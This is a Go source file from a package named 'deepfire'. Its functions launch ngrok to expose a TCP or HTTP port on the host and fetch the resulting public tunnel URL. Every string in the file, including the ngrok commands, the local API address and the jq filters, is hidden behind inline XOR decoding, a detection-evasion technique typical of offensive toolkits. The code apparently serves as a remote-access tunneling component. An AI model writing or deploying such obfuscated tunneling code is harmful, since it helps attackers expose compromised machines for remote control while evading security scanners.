package deepfire

import (
	"io/ioutil"
	"net/http"

	"github.com/savaki/jq"
)

// StartNgrokTCP exposes a TCP server on a given port.
func StartNgrokTCP(port int) error {
	_, err := CmdOut(F((func() string {
mask := []byte("\x13\xd6\xb1\xcf\x80\x9d\x6b\xdb\x02\xa9\xa3\xd2")
maskedStr := []byte("\x7d\xb1\xc3\xa0\xeb\xbd\x1f\xb8\x72\x89\x86\xb6")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), port))

	return err
}

// StartNgrokHTTP exposes a web server on a given port.
func StartNgrokHTTP(port int) error {
	_, err := CmdOut(F((func() string {
mask := []byte("\x0f\xca\x4d\xdc\xc5\x58\x10\x3d\x96\x82\xf1\x00\x32")
maskedStr := []byte("\x61\xad\x3f\xb3\xae\x78\x78\x49\xe2\xf2\xd1\x25\x56")
res := make([]byte, 13)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), port))

	return err
}

// GetNgrokURL returns the URL of the Ngrok tunnel exposing the machine.
func GetNgrokURL() (string, error) {
	local_url := (func() string {
mask := []byte("\x6b\x25\xfc\x0e\xa6\x6b\xd7\xe5\xc2\x1a\x0b\x39\xd5\xdb\xf5\x53\xe2\xdd\xda\xad\xa8\x62\x2b\x12\x00\x53\x28\xc7\x23\xbf\xb4\x6d\x53")
maskedStr := []byte("\x03\x51\x88\x7e\x9c\x44\xf8\x89\xad\x79\x6a\x55\xbd\xb4\x86\x27\xd8\xe9\xea\x99\x98\x4d\x4a\x62\x69\x7c\x5c\xb2\x4d\xd1\xd1\x01\x20")
res := make([]byte, 33)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
	resp, err := http.Get(local_url)

	if err != nil {
		return (func() string {
mask := []byte("")
maskedStr := []byte("")
res := make([]byte, 0)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), err
	}
	defer resp.Body.Close()

	json, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return (func() string {
mask := []byte("")
maskedStr := []byte("")
res := make([]byte, 0)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), err
	}
	jq_op_1, _ := jq.Parse((func() string {
mask := []byte("\x49\xb7\x06\x34\x33\x99\x26\xc8")
maskedStr := []byte("\x67\xc3\x73\x5a\x5d\xfc\x4a\xbb")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
	json_1, _ := jq_op_1.Apply(json)
	jq_op_2, _ := jq.Parse((func() string {
mask := []byte("\x16\x3e\x5f\x8e")
maskedStr := []byte("\x38\x65\x6f\xd3")
res := make([]byte, 4)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
	json_2, _ := jq_op_2.Apply(json_1)
	jq_op_3, _ := jq.Parse((func() string {
mask := []byte("\x87\x26\xde\x13\xbd\xba\xea\x1a\x03\xcd\x2e")
maskedStr := []byte("\xa9\x56\xab\x71\xd1\xd3\x89\x45\x76\xbf\x42")
res := make([]byte, 11)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
	json_3, _ := jq_op_3.Apply(json_2)
	json_sanitized := FullRemove(string(json_3), (func() string {
mask := []byte("\xac")
maskedStr := []byte("\x8e")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))

	return json_sanitized, nil
}
